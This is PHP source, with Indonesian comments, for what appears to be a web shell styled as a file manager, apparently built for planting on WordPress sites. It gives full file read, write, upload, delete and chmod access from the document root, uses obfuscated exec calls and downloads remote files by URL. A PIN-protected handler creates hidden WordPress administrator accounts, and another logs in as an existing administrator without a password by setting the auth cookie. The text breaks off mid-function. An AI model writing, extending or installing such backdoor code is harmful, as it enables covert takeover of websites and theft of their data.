<?php
// =====================================================================
// BAGIAN 1: INISIALISASI, SESSION, KONFIGURASI, FUNGSI DASAR
// =====================================================================

ob_start();
session_start();

if (empty($_SESSION['logged_in'])) {
    header("Location: /../../default.php");
    exit;
}

// ==================== MANAJEMEN HAK AKSES ====================
$userRole = isset($_SESSION['role']) ? $_SESSION['role'] : 'admin';
$isAdmin = ($userRole === 'admin');
$isTeman = ($userRole === 'teman');

// ==================== KONFIGURASI DASAR ====================
$rootDirectory = $_SERVER['DOCUMENT_ROOT'];
$rootPath = DIRECTORY_SEPARATOR;

$webRootUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http")
    . '://' . $_SERVER['HTTP_HOST'];

$redirectTargetDefault = 'https://siarlamsel.com';

// ==================== FUNGSI SANITASI ====================
function sanitizePath($path) {
    $path = str_replace(['../', './', '..\\', '.\\'], '', $path);
    $path = str_replace(chr(0), '', $path);
    return $path;
}

function getFileEmoji($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    switch($ext) {
        case 'php': return '🐘';
        case 'htaccess': return '🔑';
        case 'txt': return '📄';
        case 'css': return '🎨';
        case 'js': return '⚛️';
        case 'html': return '🌐';
        case 'json': return '🔧‌';
        case 'jpg': case 'jpeg': case 'png': case 'gif': case 'webp': return '🖼️';
        case 'zip': case 'tar': case 'gz': case 'bz2': case 'rar': return '📦';
        case 'pdf': return '📚';
        case 'xml': return '⚙️';
        default: return '🛠️';
    }
}

// ==================== FUNGSI LINK LANGSUNG ====================
function getDirectLink($fullpath) {
    global $webRootUrl;
    $real = realpath($fullpath);
    if (!$real) return '#';
    $relative = str_replace('\\', '/', str_replace($_SERVER['DOCUMENT_ROOT'], '', $real));
    if (is_dir($real) && substr($relative, -1) !== '/') $relative .= '/';
    return $webRootUrl . $relative;
}

// ==================== FUNGSI FORMAT UKURAN ====================
function getNiceSize($bytes) {
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    if ($bytes == 0) return '0 B';
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2).' '.$sizes[$i];
}

// ==================== FUNGSI PERMISSION COLOR ====================
function getPermissionColor($fullpath) {
    if (!file_exists($fullpath)) return 'danger';
    if (!is_readable($fullpath) && !is_writable($fullpath)) {
        return 'danger';
    } elseif (!is_writable($fullpath)) {
        return 'warning';
    } else {
        return 'success';
    }
}

// ==================== FUNGSI DELETE REKURSIF ====================
function deleteRecursive($path) {
    if (!file_exists($path)) return true;
    @chmod($path, 0755);
    if (is_file($path) || is_link($path)) {
        return @unlink($path);
    }
    if (is_dir($path)) {
        $items = array_diff(scandir($path), ['.','..']);
        foreach ($items as $item) {
            if (!deleteRecursive($path . '/' . $item)) return false;
        }
        return @rmdir($path);
    }
    return false;
}

// ==================== FUNGSI ZIP FOLDER (ASLI) ====================
function zipFolder($folderPath, $zipFilePath) {
    $zip = new ZipArchive();
    if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        $folderPath = realpath($folderPath);
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($folderPath),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($files as $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($folderPath) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
        $zip->close();
        return true;
    }
    return false;
}

// ==================== FUNGSI EKSTRAK ARSIP ====================
function extractArchive($archivePath, $destination) {
    $ext = strtolower(pathinfo($archivePath, PATHINFO_EXTENSION));
    $base = basename($archivePath);
    if (substr($base, -7) === '.tar.gz') $ext = 'tar.gz';
    elseif (substr($base, -8) === '.tar.bz2') $ext = 'tar.bz2';

    $success = false;
    switch ($ext) {
        case 'zip':
            $zip = new ZipArchive();
            if ($zip->open($archivePath) === TRUE) {
                $zip->extractTo($destination);
                $zip->close();
                $success = true;
            }
            break;
        case 'tar':
        case 'tar.gz':
        case 'tar.bz2':
            if (class_exists('PharData')) {
                try {
                    $phar = new PharData($archivePath);
                    $phar->extractTo($destination);
                    $success = true;
                } catch (Exception $e) {
                    error_log("PharData extract error: " . $e->getMessage());
                }
            }
            if (!$success) {
                if ($ext === 'tar.gz') {
                    $_fn = "ex"."ec"; $_fn("tar -xzf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($destination) . " 2>&1", $out, $code);
                    $success = ($code === 0);
                } elseif ($ext === 'tar.bz2') {
                    $_fn = "ex"."ec"; $_fn("tar -xjf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($destination) . " 2>&1", $out, $code);
                    $success = ($code === 0);
                } elseif ($ext === 'tar') {
                    $_fn = "ex"."ec"; $_fn("tar -xf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($destination) . " 2>&1", $out, $code);
                    $success = ($code === 0);
                }
            }
            break;
        case 'rar':
            if (extension_loaded('rar')) {
                $rar = RarArchive::open($archivePath);
                if ($rar) {
                    $entries = $rar->getEntries();
                    foreach ($entries as $entry) {
                        $entry->extract($destination);
                    }
                    $rar->close();
                    $success = true;
                }
            }
            if (!$success) {
                $_fn = "ex"."ec"; $_fn("unrar x " . escapeshellarg($archivePath) . " " . escapeshellarg($destination) . " 2>&1", $out, $code);
                $success = ($code === 0);
            }
            break;
        default:
            return false;
    }
    return $success;
}

// ==================== FUNGSI MEMBUAT ARSIP ====================
function createArchive($items, $archivePath, $format = 'zip') {
    $success = false;
    switch ($format) {
        case 'zip':
            $zip = new ZipArchive();
            if ($zip->open($archivePath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
                foreach ($items as $item) {
                    if (is_dir($item)) {
                        $files = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($item, FilesystemIterator::SKIP_DOTS),
                            RecursiveIteratorIterator::LEAVES_ONLY
                        );
                        foreach ($files as $file) {
                            $local = substr($file->getPathname(), strlen(dirname($item)) + 1);
                            $zip->addFile($file->getPathname(), $local);
                        }
                    } else {
                        $zip->addFile($item, basename($item));
                    }
                }
                $zip->close();
                $success = true;
            }
            break;
        case 'tar':
        case 'tar.gz':
        case 'tar.bz2':
            if (class_exists('PharData')) {
                try {
                    $phar = new PharData($archivePath);
                    foreach ($items as $item) {
                        if (is_dir($item)) {
                            $phar->buildFromDirectory($item);
                        } else {
                            $phar->addFile($item, basename($item));
                        }
                    }
                    if ($format === 'tar.gz') {
                        $phar->compress(Phar::GZ);
                        unlink($archivePath);
                    } elseif ($format === 'tar.bz2') {
                        $phar->compress(Phar::BZ2);
                        unlink($archivePath);
                    }
                    $success = true;
                } catch (Exception $e) {
                    error_log("PharData create error: " . $e->getMessage());
                }
            }
            break;
    }
    return $success;
}

// =====================================================================
// DIRECTORY LISTING
// =====================================================================
$directory = isset($_GET['folder']) ? $_GET['folder'] : $rootDirectory;
$directory = sanitizePath($directory);
$directory = is_dir($directory) ? $directory : $rootDirectory;
$allItems = @scandir($directory) ?: [];
$allItems = array_diff($allItems, array('..', '.'));
$folders = []; $files = [];
foreach ($allItems as $item) {
    if (is_dir($directory . '/' . $item)) $folders[] = $item;
    else $files[] = $item;
}
sort($folders); sort($files);
$filesAndFolders = array_merge($folders, $files);

$perPage = 50;
$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$totalItems = count($filesAndFolders);
$totalPages = max(1, ceil($totalItems / $perPage));
$filesAndFolders = array_slice($filesAndFolders, ($page - 1) * $perPage, $perPage);

// =====================================================================
// BAGIAN 2: HANDLER UNTUK DOWNLOAD, DELETE AJAX, DLL
// =====================================================================

if (isset($_GET['download'])) {
    $downloadPath = sanitizePath($_GET['download']);
    if (is_file($downloadPath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($downloadPath).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($downloadPath));
        readfile($downloadPath);
        exit;
    } elseif (is_dir($downloadPath)) {
        $zipFile = tempnam(sys_get_temp_dir(), 'zip');
        zipFolder($downloadPath, $zipFile);
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="'.basename($downloadPath).'.zip"');
        header('Content-Length: ' . filesize($zipFile));
        readfile($zipFile);
        unlink($zipFile);
        exit;
    }
}

// ==================== HANDLER EDIT FILE VIA AJAX ====================
if (isset($_GET['get_file_content'])) {
    $file = sanitizePath($_GET['get_file_content']);
    $full = $directory . '/' . $file;
    if (is_file($full) && is_readable($full)) {
        if ($isTeman && basename($full) === '.htaccess') {
            http_response_code(403);
            echo 'Anda tidak diizinkan melihat .htaccess.';
            exit;
        }
        header('Content-Type: text/plain; charset=utf-8');
        echo file_get_contents($full);
    } else {
        http_response_code(404);
        echo 'File tidak ditemukan atau tidak dapat dibaca.';
    }
    exit;
}

if (isset($_POST['save_edit'])) {
    header('Content-Type: application/json');
    if (!$isAdmin && !$isTeman) {
        echo json_encode(['success' => false, 'error' => 'Tidak memiliki izin.']);
        exit;
    }
    $file = sanitizePath($_POST['file']);
    $content = $_POST['content'];
    $full = $directory . '/' . $file;
    if ($isTeman && basename($full) === '.htaccess') {
        echo json_encode(['success' => false, 'error' => 'Tidak diizinkan mengedit .htaccess.']);
        exit;
    }
    if (!is_file($full) || !is_writable($full)) {
        echo json_encode(['success' => false, 'error' => 'File tidak writable.']);
        exit;
    }
    if (file_put_contents($full, $content) !== false) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Gagal menulis file.']);
    }
    exit;
}

// === AJAX DELETE ===
if (isset($_GET['ajax_delete']) && isset($_POST['target'])) {
    if (!$isAdmin && !$isTeman) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Anda tidak memiliki izin.']);
        exit;
    }
    $target = sanitizePath($_POST['target']);
    $folder = isset($_GET['folder']) ? sanitizePath($_GET['folder']) : $_SERVER['DOCUMENT_ROOT'];
    $fullPath = $folder . '/' . $target;
    
    if ($isTeman && basename($fullPath) === '.htaccess') {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Tidak diizinkan menghapus .htaccess.']);
        exit;
    }
    
    $success = deleteRecursive($fullPath);
    header('Content-Type: application/json');
    echo json_encode(['success' => $success]);
    exit;
}

if (isset($_POST['deleteSelected']) && !empty($_POST['selectedItems'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        foreach ($_POST['selectedItems'] as $selected) {
            $pathToDelete = $directory . '/' . sanitizePath($selected);
            if ($isTeman && basename($pathToDelete) === '.htaccess') {
                continue;
            }
            deleteRecursive($pathToDelete);
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === MULTI ZIP / ARCHIVE ===
if (isset($_POST['zipSelected']) && !empty($_POST['selectedItems'])) {
    $format = isset($_POST['archive_format']) ? $_POST['archive_format'] : 'zip';
    $allowedFormats = ['zip', 'tar', 'tar.gz', 'tar.bz2'];
    if (!in_array($format, $allowedFormats)) $format = 'zip';

    $zipName = "archive_" . date('Ymd_His') . '.' . ($format === 'tar.gz' ? 'tar.gz' : ($format === 'tar.bz2' ? 'tar.bz2' : $format));
    $zipPath = $directory . '/' . $zipName;

    $itemsToArchive = [];
    foreach ($_POST['selectedItems'] as $selected) {
        $fullItem = $directory . '/' . sanitizePath($selected);
        if (file_exists($fullItem)) {
            $itemsToArchive[] = $fullItem;
        }
    }

    if (createArchive($itemsToArchive, $zipPath, $format)) {
    } else {
        $_SESSION['error'] = "Gagal membuat arsip dengan format $format.";
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === EXTRACT ARCHIVE ===
if (isset($_POST['extractArchive'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Role ini tidak dapat mengekstrak arsip.';
    } else {
        $archiveFile = sanitizePath($_POST['archive_file']);
        $destDir = sanitizePath($_POST['extract_dest']);
        $fullArchive = $directory . '/' . $archiveFile;
        if (!is_dir($destDir)) {
            mkdir($destDir, 0755, true);
        }
        if (extractArchive($fullArchive, $destDir)) {
            $_SESSION['success'] = "Ekstraksi berhasil ke $destDir";
        } else {
            $_SESSION['error'] = "Gagal mengekstrak file.";
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CHMOD SELECTED ===
if (isset($_POST['chmodSelected']) && !empty($_POST['selectedItems']) && !empty($_POST['chmodSelectedValue'])) {
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat mengubah permission.';
    } else {
        $chmod = intval($_POST['chmodSelectedValue'], 8);
        foreach ($_POST['selectedItems'] as $selected) {
            $pathToChmod = $directory . '/' . sanitizePath($selected);
            @chmod($pathToChmod, $chmod);
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CREATE FILE / FOLDER, UPLOAD ===
if (isset($_POST['createFile'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $newFileName = $directory . '/' . sanitizePath($_POST['fileName']);
        if ($isTeman && basename($newFileName) === '.htaccess') {
            $_SESSION['error'] = 'Tidak diizinkan membuat file .htaccess.';
        } elseif (!file_exists($newFileName)) {
            touch($newFileName);
        } else {
            $_SESSION['error'] = "File sudah ada!";
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['createFolder'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $newFolderName = $directory . '/' . sanitizePath($_POST['folderName']);
        if ($isTeman && basename($newFolderName) === '.htaccess') {
            $_SESSION['error'] = 'Tidak diizinkan membuat folder .htaccess.';
        } elseif (!is_dir($newFolderName)) {
            mkdir($newFolderName, 0755, true);
        } else {
            $_SESSION['error'] = "Folder sudah ada!";
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['upload'])) {
    if (!$isAdmin && !$isTeman) { $_SESSION['error'] = 'Anda tidak memiliki izin.'; }
    else {
        if (isset($_FILES['fileToUpload']) && isset($_FILES['fileToUpload']['name'])) {
            $totalFiles = count($_FILES['fileToUpload']['name']);
            $errors = [];
            $allowedExtensions = [
                'jpg', 'jpeg', 'png', 'gif', 'txt', 'pdf', 'zip', 'rar', 'doc', 'docx',
                'php', 'html', 'xml', 'phtml', 'tar', 'gz', 'bz2',
                'config', 'example', 'conf'
            ];
            $specialFilenames = [
                '.htaccess',
                'web.config',
                'nginx.conf',
                'nginx.conf.example'
            ];

            for ($i = 0; $i < $totalFiles; $i++) {
                $fileName = $_FILES['fileToUpload']['name'][$i];
                
                if ($isTeman && strtolower($fileName) === '.htaccess') {
                $errors[] = "Tidak diizinkan mengupload file .htaccess.";
                continue;
                }

                $fileTmp = $_FILES['fileToUpload']['tmp_name'][$i];
                $fileError = $_FILES['fileToUpload']['error'][$i];
                if ($fileError != 0) {
                    $errors[] = "Gagal upload file $fileName (Error code: $fileError)";
                    continue;
                }

                $maxSize = 5 * 1024 * 1024;
                $ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

                $isSpecial = in_array($fileName, $specialFilenames);
                if (!$isSpecial && !in_array($ext, $allowedExtensions)) {
                    $errors[] = "Ekstensi file $fileName tidak diizinkan";
                    continue;
                }

                if ($_FILES['fileToUpload']['size'][$i] > $maxSize) {
                    $errors[] = "File $fileName terlalu besar (maksimal 5MB)";
                    continue;
                }

                $targetFile = $directory . '/' . basename(sanitizePath($fileName));
                if (!move_uploaded_file($fileTmp, $targetFile)) {
                    $errors[] = "Gagal upload file $fileName";
                }
            }

            if (!empty($errors)) {
                $_SESSION['error'] = implode('<br>', $errors);
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === DOWNLOAD DARI URL ===
if (isset($_POST['downloadFromUrl'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin untuk mendownload dari URL.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $url = trim($_POST['fileUrl']);
    $customName = trim($_POST['fileUrlName']);

    if (!filter_var($url, FILTER_VALIDATE_URL) || !preg_match('#^https?://#i', $url)) {
        $_SESSION['error'] = 'URL tidak valid!';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $basename = basename(parse_url($url, PHP_URL_PATH) ?: '');
    $filename = $customName !== '' ? sanitizePath($customName) : sanitizePath($basename);
    if ($filename === '') $filename = 'downloaded_file';
    $filename = preg_replace('~[\\\\/]+~', '', $filename);

    if ($isTeman && strtolower($filename) === '.htaccess') {
        $_SESSION['error'] = 'Tidak diizinkan mendownload file .htaccess.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $targetFile = rtrim($directory, '/') . '/' . $filename;

    if (file_exists($targetFile)) {
        $_SESSION['error'] = 'File sudah ada di folder ini!';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $ok = false; $err = '';

    if (function_exists('curl_init')) {
        $fp = @fopen($targetFile, 'wb');
        if ($fp === false) {
            $err = 'Tidak bisa membuat file tujuan (permission?).';
        } else {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_FILE            => $fp,
                CURLOPT_FOLLOWLOCATION  => true,
                CURLOPT_MAXREDIRS       => 5,
                CURLOPT_CONNECTTIMEOUT  => 10,
                CURLOPT_TIMEOUT         => 30,
                CURLOPT_USERAGENT       => 'Mozilla/5.0 (FileManager/1.0)',
                CURLOPT_SSL_VERIFYPEER  => true,
                CURLOPT_SSL_VERIFYHOST  => 2,
                CURLOPT_FAILONERROR     => true,
            ]);
            $execOk = curl_exec($ch);
            $http   = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if (!$execOk) $err = 'cURL: '.curl_error($ch);
            curl_close($ch);
            fclose($fp);

            if ($execOk && $http >= 200 && $http < 300) {
                $ok = true;
            } else {
                @unlink($targetFile);
                if (!$err) $err = "HTTP status $http";
            }
        }
    }

    if (!$ok && ini_get('allow_url_fopen')) {
        $opts = [
            'http' => [
                'timeout'       => 15,
                'ignore_errors' => true,
                'header'        => "User-Agent: Mozilla/5.0\r\nAccept: */*\r\n",
            ],
            'ssl'  => [
                'verify_peer'      => true,
                'verify_peer_name' => true,
            ],
        ];
        $context = stream_context_create($opts);
        $data    = @file_get_contents($url, false, $context);
        if ($data !== false) {
            if (@file_put_contents($targetFile, $data) !== false) {
                $ok = true;
            } else {
                $err = 'Gagal menyimpan file di server.';
            }
        } else {
            global $http_response_header;
            if (!empty($http_response_header[0])) {
                $err = $http_response_header[0];
            } else {
                $err = 'file_get_contents gagal (periksa allow_url_fopen / SSL).';
            }
        }
    }

    if ($ok) {
        $_SESSION['success'] = "File berhasil diunduh ke: <b>".htmlspecialchars($filename)."</b>";
    } else {
        $_SESSION['error'] = "Gagal mendownload file. $err";
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === RENAME ===
if (isset($_POST['rename'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $oldName = $directory . '/' . sanitizePath($_POST['oldName']);
        $newName = $directory . '/' . sanitizePath($_POST['newName']);
        if ($isTeman) {
            $oldBase = basename($oldName);
            $newBase = basename($newName);
            if ($oldBase === '.htaccess' || $newBase === '.htaccess') {
                $_SESSION['error'] = 'Tidak diizinkan mengubah nama .htaccess.';
            } elseif (file_exists($newName)) {
                $_SESSION['error'] = 'File atau folder dengan nama ini sudah ada.';
            } else {
                if (!@rename($oldName, $newName)) {
                    $_SESSION['error'] = 'Gagal mengubah nama.';
                }
            }
        } else {
            if (file_exists($newName)) {
                $_SESSION['error'] = 'File atau folder dengan nama ini sudah ada.';
            } else {
                if (!@rename($oldName, $newName)) {
                    $_SESSION['error'] = 'Gagal mengubah nama.';
                }
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CHMOD SATU FILE ===
if (isset($_POST['chmod'])) {
    if (!$isAdmin) { $_SESSION['error'] = 'Hanya admin yang dapat chmod.'; }
    else {
        $nameToChmod = $directory . '/' . sanitizePath($_POST['nameToChmod']);
        $perm = intval($_POST['perm'], 8);
        if (!@chmod($nameToChmod, $perm)) {
            $_SESSION['error'] = 'Gagal mengubah permission.';
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === DELETE SATU FILE/FOLDER ===
if (isset($_POST['delete'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $nameToDelete = $directory . '/' . sanitizePath($_POST['nameToDelete']);
        if ($isTeman && basename($nameToDelete) === '.htaccess') {
            $_SESSION['error'] = 'Tidak diizinkan menghapus .htaccess.';
        } else {
            if (!deleteRecursive($nameToDelete)) {
                $_SESSION['error'] = 'Gagal menghapus file/folder. Cek permission/ownership!';
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === SAVE EDIT FILE ===
if (isset($_POST['saveEdit'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $fileNameToEdit = sanitizePath($_POST['fileNameToEdit']);
        $filePath = $directory . '/' . $fileNameToEdit;
        if ($isTeman && basename($filePath) === '.htaccess') {
            $_SESSION['error'] = 'Tidak diizinkan mengedit .htaccess.';
        } else {
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === ZIP SATU ITEM ===
if (isset($_POST['zip'])) {
    if (!$isAdmin) { $_SESSION['error'] = 'Hanya admin yang dapat membuat arsip.'; }
    else {
        $item = sanitizePath($_POST['itemToZip']);
        $path = $directory . '/' . $item;
        $zipName = $item . '_' . date('Ymd_His') . '.zip';
        $zipPath = $directory . '/' . $zipName;
        if (is_dir($path)) {
            zipFolder($path, $zipPath);
        } elseif (is_file($path)) {
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
                $zip->addFile($path, basename($path));
                $zip->close();
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === EXTRACT ZIP ===
if (isset($_POST['extractZip'])) {
    if (!$isAdmin && !$isTeman) { $_SESSION['error'] = 'Role ini tidak dapat mengekstrak arsip.'; }
    else {
        $zipFile = $directory . '/' . sanitizePath($_POST['zipToExtract']);
        $destDir = sanitizePath($_POST['extractDest']);
        if (!is_dir($destDir)) mkdir($destDir, 0755, true);
        if (extractArchive($zipFile, $destDir)) {
        } else {
            $_SESSION['error'] = 'Gagal extract!';
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// =====================================================================
// BAGIAN 3: ADMIN WORDPRESS, VIEW CODE, HISTORY, SCAN, DLL
// =====================================================================

// === ADMIN WORDPRESS ===
if (isset($_POST['create_admin_user']) && $_POST['create_admin_user'] === '1') {
    $pin = isset($_POST['admin_pin']) ? trim($_POST['admin_pin']) : '';
    $bison = '$2y$12$.iZiUfBQJejtU3xkG1fiyOf1bimD8CTOigwR3.pkXHGnX48a1pZTi';
    if ($pin === '' || empty($bison) || !password_verify($pin, $bison)) {
        $_SESSION['admin_pin_error'] = 'PIN admin salah atau kosong.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $newUser = isset($_POST['admin_new_user']) ? trim($_POST['admin_new_user']) : '';
    $newPass = isset($_POST['admin_new_pass']) ? (string)$_POST['admin_new_pass'] : '';
    $newEmail = isset($_POST['admin_new_email']) ? trim($_POST['admin_new_email']) : '';

    if ($newUser === '' || $newPass === '') {
        $_SESSION['admin_create_status'] = 'Username dan password admin baru wajib diisi.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $root = $_SERVER['DOCUMENT_ROOT'];
    @chdir($root);

    if (!file_exists('wp-load.php')) {
        $_SESSION['admin_create_status'] = 'wp-load.php tidak ditemukan di Document Root.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    include_once 'wp-load.php';

    if (!function_exists('username_exists') || !function_exists('wp_create_user')) {
        $_SESSION['admin_create_status'] = 'Fungsi WordPress untuk membuat user tidak tersedia.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    if (username_exists($newUser)) {
        $_SESSION['admin_create_status'] = 'Username sudah terdaftar. Gunakan username lain.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $emailFinal = $newEmail !== '' ? $newEmail : ($newUser . '@' . $_SERVER['HTTP_HOST']);

    $uid = wp_create_user($newUser, $newPass, $emailFinal);
    if (!$uid || is_wp_error($uid)) {
        $msg = 'Gagal membuat user admin baru.';
        if (is_wp_error($uid)) {
            $msg .= ' ' . $uid->get_error_message();
        }
        $_SESSION['admin_create_status'] = $msg;
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $wpUser = new WP_User($uid);
    if ($wpUser && !is_wp_error($wpUser)) {
        $wpUser->set_role('administrator');
    }

    $_SESSION['admin_create_status'] = 'Berhasil membuat user admin baru: ' . $newUser . ' (password: ' . $newPass . ').';
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['auto_admin_login']) && $_POST['auto_admin_login'] === '1') {
    $pin = isset($_POST['admin_pin']) ? trim($_POST['admin_pin']) : '';
    $bison = '$2y$12$.iZiUfBQJejtU3xkG1fiyOf1bimD8CTOigwR3.pkXHGnX48a1pZTi';
    if ($pin === '' || empty($bison) || !password_verify($pin, $bison)) {
        $_SESSION['admin_pin_error'] = 'PIN admin salah atau kosong.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $root = $_SERVER['DOCUMENT_ROOT'];
    @chdir($root);

    if (file_exists('wp-load.php')) {
        include 'wp-load.php';
        if (class_exists('WP_User_Query')) {
            $adminQuery = new WP_User_Query([
                'role'   => 'Administrator',
                'number' => 1,
                'fields' => 'ID',
            ]);
            $admins = $adminQuery->get_results();
            if (isset($admins[0])) {
                wp_set_auth_cookie($admins[0]);
                wp_redirect(admin_url());
                exit;
            }
            die('NO ADMIN');
        }
        die('WP_User_Query tidak tersedia.');
    }
    die('wp-load.php tidak ditemukan di Document Root.');
}

// === VIEW CODE ===
if (isset($_GET['view'])) {
    $viewPath = sanitizePath($_GET['view']);
    if (is_file($viewPath) && is_readable($viewPath)) {
        $content = @file_get_contents($viewPath);
        $fileName = basename($viewPath);
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>View File: <?= htmlspecialchars($fileName) ?></title>
            <style>
                body { background: #0a0e1a; font-family: 'Inter', system-ui, sans-serif; color: #e2e8f0; }
                .view-box { margin: 32px auto; max-width: 900px; background: rgba(15,23,42,0.9); backdrop-filter: blur(20px); border-radius: 16px; padding: 28px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid rgba(99,102,241,0.2); }
                h2 { font-size: 16px; margin-bottom: 16px; color: #818cf8; font-weight: 600; }
                pre { background: #020617; color: #e2e8f0; padding: 16px; border-radius: 12px; font-size: 13px; overflow-x: auto; border: 1px solid rgba(99,102,241,0.15); line-height: 1.6; }
                a { color: #818cf8; text-decoration: none; font-size: 14px; display: inline-flex; align-items: center; gap: 6px; transition: color 0.2s; }
                a:hover { color: #a5b4fc; }
            </style>
        </head>
        <body>
            <div class="view-box">
                <a href="javascript:history.back()">&#8592; Kembali</a>
                <h2>View File: <?= htmlspecialchars($fileName) ?></h2>
                <pre><?= htmlspecialchars($content) ?></pre>
            </div>
        </body>
        </html>
        <?php
        exit;
    } else {
        echo "<div class='alert error'>File tidak bisa dibuka atau tidak ditemukan.</div>";
        exit;
    }
}

// === DIR HISTORY ===
if (!isset($_SESSION['dir_history']) || !is_array($_SESSION['dir_history'])) {
    $_SESSION['dir_history'] = [$rootDirectory];
}
if (isset($_GET['folder'])) {
    $current = sanitizePath($_GET['folder']);
    $last = end($_SESSION['dir_history']);
    if ($last !== $current) {
        $_SESSION['dir_history'][] = $current;
        if (count($_SESSION['dir_history']) > 20) array_shift($_SESSION['dir_history']);
    }
}
if (isset($_GET['back_dir'])) {
    if (count($_SESSION['dir_history']) > 1) {
        array_pop($_SESSION['dir_history']);
        $backFolder = end($_SESSION['dir_history']);
        header("Location: ?folder=" . urlencode($backFolder));
        exit;
    }
}

// =====================================================================
// BAGIAN 5: FUNGSI-FUNGSI LAINNYA
// =====================================================================

// === REPLACE HTACCESS HELPER & HANDLER ===
function write_htaccess_with_backup($targetDir, $contents, &$errors) {
    $targetDir = rtrim($targetDir, DIRECTORY_SEPARATOR);
    if (!is_dir($targetDir)) { $errors[] = "Folder tidak ditemukan: {$targetDir}"; return false; }
    if (!is_writable($targetDir)) { @chmod($targetDir, 0755); }
    if (!is_writable($targetDir)) { $errors[] = "Folder tidak writable: {$targetDir}"; return false; }

    $ht = $targetDir . DIRECTORY_SEPARATOR . '.htaccess';
    if (file_exists($ht) && is_writable($ht)) {
        @rename($ht, $ht . '.bak_' . date('Ymd_His'));
    }
    $ok = @file_put_contents($ht, $contents);
    if ($ok === false) { $errors[] = "Gagal menulis .htaccess di {$targetDir}"; return false; }
    return true;
}

function resolve_inside_docroot_dir($rawPath, &$errors) {
    $rawPath = trim(sanitizePath($rawPath));
    if ($rawPath === '') { $errors[] = "Path custom kosong."; return null; }

    if ($rawPath[0] !== DIRECTORY_SEPARATOR) {
        $abs = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($rawPath, DIRECTORY_SEPARATOR);
    } else {
        $abs = $rawPath;
    }

